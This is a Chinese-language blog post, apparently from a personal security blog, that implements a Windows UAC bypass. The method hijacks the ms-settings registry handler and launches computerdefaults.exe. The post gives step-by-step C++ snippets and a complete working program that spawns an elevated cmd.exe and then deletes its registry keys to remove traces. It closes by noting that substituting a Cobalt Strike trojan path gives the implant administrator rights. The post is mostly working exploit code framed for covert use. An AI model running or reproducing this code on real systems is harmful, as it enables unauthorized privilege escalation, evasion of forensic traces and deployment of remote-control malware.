+<h1 id="bypass的实现"><a href="#bypass的实现" class="headerlink" title="bypass的实现"></a>bypass的实现</h1><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-创建新键"><a href="#1-创建新键" class="headerlink" title="1.创建新键"></a>1.创建新键</h3><p>在 <code>HKEY_CURRENT_USER\Software\Classes</code> 注册表路径下创建一个名为 <code>ms-settings\shell\open\command</code> 的新键（如果该键已存在则打开它）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建或打开注册表键</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, subKey, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to create or open registry key\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-创建键值"><a href="#2-创建键值" class="headerlink" title="2.创建键值"></a>2.创建键值</h3><p>在刚刚创建的键下，创建一个名为 <code>DelegateExecute</code> 的键值，并将其设置为空字符串</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加 &quot;DelegateExecute&quot; 键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)<span class="string">&quot;&quot;</span>, <span class="built_in">sizeof</span>(<span class="string">&quot;&quot;</span>)) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-设置键的默认键值"><a href="#3-设置键的默认键值" class="headerlink" title="3.设置键的默认键值"></a>3.设置键的默认键值</h3><p>设置 <code>ms-settings\shell\open\command</code> 键的默认键值为 <code>filename</code> 变量，这里是 <code>&quot;cmd.exe&quot;</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置默认键值为 &quot;calc.exe&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)filename, <span class="built_in">strlen</span>(filename) + <span class="number">1</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set default registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-启动进程"><a href="#4-启动进程" class="headerlink" title="4.启动进程"></a>4.启动进程</h3><p>使用 <code>CreateProcess</code> 函数启动新的进程来执行 <code>&quot;C://windows//system32//cmd.exe&quot;</code> 这个命令，命令参数是 <code>/c C://windows//system32//computerdefaults.exe</code>。当这个命令执行时，它实际上会通过 <code>ms-settings\shell\open\command</code> 注册表键执行 <code>cmd.exe</code>，因为此键的默认键值被设置为 <code>cmd.exe</code>。这个过程就是用户账户控制（UAC）的绕过</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFO si;  <span class="comment">//进程启动信息</span></span><br><span class="line">	PROCESS_INFORMATION pi;  <span class="comment">//进程信息</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(si));  <span class="comment">//将结构体si的所有成员都初始化为0</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in">sizeof</span>(pi));  <span class="comment">//将结构体pi的所有成员都初始化为0</span></span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(si);  <span class="comment">//结构体大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(</span><br><span class="line">		<span class="string">&quot;C://windows//system32//cmd.exe&quot;</span>,  <span class="comment">//要执行的应用程序名称（包含路径）</span></span><br><span class="line">		(LPSTR)<span class="string">&quot;/c C://windows//system32//computerdefaults.exe&quot;</span>,  <span class="comment">//命令行参数</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//进程句柄不可被继承</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//线程句柄不可被继承</span></span><br><span class="line">		FALSE,  <span class="comment">//不继承句柄</span></span><br><span class="line">		<span class="number">0</span>,  <span class="comment">//标志位为0</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的环境变量</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的工作目录</span></span><br><span class="line">		&amp;si,  <span class="comment">//传递启动信息</span></span><br><span class="line">		&amp;pi)  <span class="comment">//传递进程信息</span></span><br><span class="line">		) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcess failed (%d).\n&quot;</span>, <span class="built_in">GetLastError</span>());  <span class="comment">//打印错误信息</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放进程句柄和线程句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-清理痕迹"><a href="#5-清理痕迹" class="headerlink" title="5.清理痕迹"></a>5.清理痕迹</h3><p>为了清理痕迹，程序等待一段时间后删除 <code>HKEY_CURRENT_USER\Software\Classes\ms-settings</code> 键，删除所有刚刚创建的键和键值</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除整个ms-settings目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">RegDeleteTree</span>(HKEY_CURRENT_USER,<span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>) != ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;RegDeleteTree Error:%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BypassUac.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">BypassUac</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* subKey = <span class="string">&quot;Software\\Classes\\ms-settings\\shell\\open\\command&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* valueName = <span class="string">&quot;DelegateExecute&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建或打开注册表键</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, subKey, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to create or open registry key\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加 &quot;DelegateExecute&quot; 键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)<span class="string">&quot;&quot;</span>, <span class="built_in">sizeof</span>(<span class="string">&quot;&quot;</span>)) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置默认键值为 &quot;calc.exe&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)filename, <span class="built_in">strlen</span>(filename) + <span class="number">1</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set default registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO si;  <span class="comment">//进程启动信息</span></span><br><span class="line">	PROCESS_INFORMATION pi;  <span class="comment">//进程信息</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(si));  <span class="comment">//将结构体si的所有成员都初始化为0</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in">sizeof</span>(pi));  <span class="comment">//将结构体pi的所有成员都初始化为0</span></span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(si);  <span class="comment">//结构体大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(</span><br><span class="line">		<span class="string">&quot;C://windows//system32//cmd.exe&quot;</span>,  <span class="comment">//要执行的应用程序名称（包含路径）</span></span><br><span class="line">		(LPSTR)<span class="string">&quot;/c C://windows//system32//computerdefaults.exe&quot;</span>,  <span class="comment">//命令行参数</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//进程句柄不可被继承</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//线程句柄不可被继承</span></span><br><span class="line">		FALSE,  <span class="comment">//不继承句柄</span></span><br><span class="line">		<span class="number">0</span>,  <span class="comment">//标志位为0</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的环境变量</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的工作目录</span></span><br><span class="line">		&amp;si,  <span class="comment">//传递启动信息</span></span><br><span class="line">		&amp;pi)  <span class="comment">//传递进程信息</span></span><br><span class="line">		) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcess failed (%d).\n&quot;</span>, <span class="built_in">GetLastError</span>());  <span class="comment">//打印错误信息</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放进程句柄和线程句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//删除整个ms-settings目录</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">RegDeleteTree</span>(HKEY_CURRENT_USER,<span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>) != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;RegDeleteTree Error:%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* filename = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">	<span class="built_in">BypassUac</span>(filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>执行程序后返回一个管理员权限的cmd				</p>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/%E5%8A%A8%E7%94%BB.gif" alt="动画"></p>
+<p>如果我们将cmd.exe替换成cs木马的地址，那么cs就会以管理员权限上线</p>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/%E5%8A%A8%E7%94%BB-16874925352742.gif" alt="动画"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/04/29/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/04/29/WeakDefender/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFUAC"><span class="nav-number">1.</span> <span class="nav-text">什么是UAC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98"><span class="nav-number">2.</span> <span class="nav-text">Uac白名单挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%80%E9%9C%80%E5%B7%A5%E5%85%B7"><span class="nav-number">2.2.</span> <span class="nav-text">所需工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E7%AD%9B%E9%80%89%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.3.</span> <span class="nav-text">白名单的筛选条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%96%E6%8E%98%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.4.</span> <span class="nav-text">挖掘步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-autoElevate%E5%80%BC%E4%B8%BAtrue"><span class="nav-number">2.4.1.</span> <span class="nav-text">1.autoElevate值为true</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%B0%83%E7%94%A8Shell-Open-command%E9%94%AE"><span class="nav-number">2.4.2.</span> <span class="nav-text">2.调用Shell\Open\command键</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.5.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bypass%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">bypass的实现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="nav-number">3.1.</span> <span class="nav-text">实现思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%9B%E5%BB%BA%E6%96%B0%E9%94%AE"><span class="nav-number">3.1.1.</span> <span class="nav-text">1.创建新键</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%9B%E5%BB%BA%E9%94%AE%E5%80%BC"><span class="nav-number">3.1.2.</span> <span class="nav-text">2.创建键值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%AE%BE%E7%BD%AE%E9%94%AE%E7%9A%84%E9%BB%98%E8%AE%A4%E9%94%AE%E5%80%BC"><span class="nav-number">3.1.3.</span> <span class="nav-text">3.设置键的默认键值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B"><span class="nav-number">3.1.4.</span> <span class="nav-text">4.启动进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9"><span class="nav-number">3.1.5.</span> <span class="nav-text">5.清理痕迹</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="nav-number">3.2.</span> <span class="nav-text">完整代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="nav-number">3.3.</span> <span class="nav-text">运行测试</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xiao Ni"
+      src="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
+  <p class="site-author-name" itemprop="name">Xiao Ni</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiao Ni</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+#running-time
+
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+        var pvcountOffset = 80000;  // 初始化首次数据
+        var uvcountOffset = 20000;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int); // 停止检测
+            }
+        }
+    });
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
